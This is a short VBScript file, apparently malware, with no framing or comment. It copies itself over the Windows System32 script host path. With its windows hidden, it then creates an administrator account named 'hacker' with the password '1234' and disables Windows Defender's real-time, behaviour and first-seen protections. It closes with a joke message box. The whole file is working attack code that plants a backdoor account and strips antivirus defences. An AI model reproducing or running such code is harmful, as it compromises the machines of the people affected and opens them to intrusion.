Set objShell = CreateObject("WScript.Shell")
Set objFSO = CreateObject("Scripting.FileSystemObject")

If Not objFSO.FileExists("C:\Windows\System32\wscript.exe") Then
    objFSO.CopyFile WScript.ScriptFullName, "C:\Windows\System32\wscript.exe"
    objShell.Run "C:\Windows\System32\wscript.exe"
    WScript.Quit
End If

objShell.Run "cmd /c net user hacker 1234 /add", 0, True
objShell.Run "cmd /c net localgroup administrators hacker /add", 0, True
objShell.Run "powershell -Command Set-MpPreference -DisableRealtimeMonitoring $true", 0, True
objShell.Run "powershell -Command Set-MpPreference -DisableBehaviorMonitoring $true", 0, True
objShell.Run "powershell -Command Set-MpPreference -DisableBlockAtFirstSeen $true", 0, True

MsgBox "Flo is so cool!"

WScript.Quit
